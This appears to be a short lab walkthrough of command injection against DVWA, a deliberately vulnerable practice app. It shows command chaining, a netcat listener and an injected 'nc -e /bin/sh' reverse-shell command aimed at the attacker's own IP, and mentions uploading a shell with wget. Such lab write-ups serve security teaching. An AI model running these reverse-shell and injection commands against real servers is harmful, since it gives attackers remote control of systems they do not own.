
# Command Injection

Command Injection attack is performed by using arbitrary commands(The command which helps the system to run for example the commands used to play around with the file management system).

## What can we do by using the Command Injection attack ?

1. We can get control over the shell or terminal of the server where the website is hosted.   
2. Can upload shell using wget command on the public platform which can be highly exploitable.  

## Performing attack on DVWA 

1. Changing the security level of DVWA to low level of security. 

![image](https://user-images.githubusercontent.com/60937657/194223462-0e43d07a-d6dd-4291-8777-f9c30ff0c9e2.png)

![image](https://user-images.githubusercontent.com/60937657/194223357-3a83b501-8961-4646-b043-efc1e4060faf.png)

2. Find the IP address using terminal. 

```
  ifconfig 
```

3. Enter IP address to DVWA.  

![image](https://user-images.githubusercontent.com/60937657/194224867-2863f530-e203-4c53-92bf-344421fb8116.png)

4. Performing arbitrary command.

**Note** We will use arbitrary commands using piping. 

**For Example** 

```
  ls ; pwd 
```
```
  ls && pwd 
```
```
#In this way of piping we will only be output of final command which in pwd in this case.
  ls | pwd 
```
![image](https://user-images.githubusercontent.com/60937657/194370933-c383fb1c-ca37-48d2-ba90-a91d5ae01d8c.png)

5. Make a connection in shell of website server with terminal of our machine by starting netcat services for linux based server 

Using the below given command in terminal.

```
nc -vv -l -p 8080
```

![image](https://user-images.githubusercontent.com/60937657/194373887-5eb2d874-5036-4779-b0e8-a3bd5dbcdf2e.png)

**Note** Netcat service will always be hosted in bin folder of linux as per the architecture

6. Using a command in which we are going to use IP of our OS to fire on website by which we are going to get a connection in out terminal. 

```
nc -e /bin/sh IP_Address_of_my_OS 8080
```

![image](https://user-images.githubusercontent.com/60937657/194376389-1efd866c-c799-491e-8f69-ea807c39928c.png)





